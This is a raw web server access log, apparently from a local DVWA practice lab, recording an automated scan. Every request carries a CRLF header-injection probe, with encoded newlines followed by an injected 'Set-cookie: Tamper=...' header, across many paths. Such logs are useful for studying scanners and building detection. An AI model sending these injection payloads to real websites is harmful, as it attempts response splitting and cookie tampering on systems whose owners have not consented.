172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355 HTTP/1.1" 301 664 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%3F%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355 HTTP/1.1" 301 670 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%0D%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355%0D%0A HTTP/1.1" 301 682 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D9e8c5636-aa7e-44fe-aa62-e5cf46a00355%0D%0A HTTP/1.1" 301 688 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%3F%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%0D%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78%0D%0A HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /docs/DVWA_v1.3.pdf?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D975d44aa-d9e5-440c-970c-683da9436f78%0D%0A HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=Set-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e HTTP/1.1" 301 652 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%0D%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e HTTP/1.1" 301 670 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=Set-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df HTTP/1.1" 301 660 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e HTTP/1.1" 301 676 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%0D%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df HTTP/1.1" 301 678 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e HTTP/1.1" 301 664 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df HTTP/1.1" 301 684 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%3F%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e HTTP/1.1" 301 670 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df HTTP/1.1" 301 672 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%0D%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e%0D%0A HTTP/1.1" 301 682 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%3F%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df HTTP/1.1" 301 678 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D8238c101-e0b2-463d-910b-ffb6660ffe0e%0D%0A HTTP/1.1" 301 688 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%0D%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df%0D%0A HTTP/1.1" 301 690 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D144e6fab-ebb1-48fc-89d1-94a09be7d9df%0D%0A HTTP/1.1" 301 696 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=Set-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=Set-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%0D%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%0D%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%3F%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%3F%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%0D%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d%0D%0A HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%0D%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42%0D%0A HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/login.css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Ddf7e5ef5-efa0-4cb5-913b-08edc097088d%0D%0A HTTP/1.1" 200 1112 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:50 +0000] "GET /dvwa/css/main.css?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D31058afd-4b17-4422-86a2-cb3a2df2ac42%0D%0A HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=Set-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387 HTTP/1.1" 301 666 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=Set-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%0D%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387 HTTP/1.1" 301 684 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387 HTTP/1.1" 301 690 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%0D%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387 HTTP/1.1" 301 678 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%3F%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387 HTTP/1.1" 301 684 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%0D%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387%0D%0A HTTP/1.1" 301 696 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D52fed10b-3f59-44c5-a4bf-795fe1445387%0D%0A HTTP/1.1" 301 702 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%3F%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%0D%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9%0D%0A HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/login_logo.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D4a8d88e5-2b79-4f9f-9611-a0de63febbf9%0D%0A HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=Set-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=Set-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%0D%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%0D%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%3F%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%3F%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%0D%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f%0D%0A HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%0D%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29%0D%0A HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/logo.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D6498faff-a677-4158-8a17-bd674e2b328f%0D%0A HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/RandomStorm.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7fcc0854-8330-4042-80c0-d237326d3b29%0D%0A HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=Set-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%0D%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=Set-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7 HTTP/1.1" 301 658 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%0D%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7 HTTP/1.1" 301 676 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%3F%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7 HTTP/1.1" 301 682 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%0D%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6%0D%0A HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7 HTTP/1.1" 301 670 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/images/spanner.png?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dbda39d95-e292-40c8-9b45-f1ef789f77d6%0D%0A HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%3F%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7 HTTP/1.1" 301 676 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%0D%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7%0D%0A HTTP/1.1" 301 688 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D3f237a0d-02a5-4b52-a614-147f661996c7%0D%0A HTTP/1.1" 301 694 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
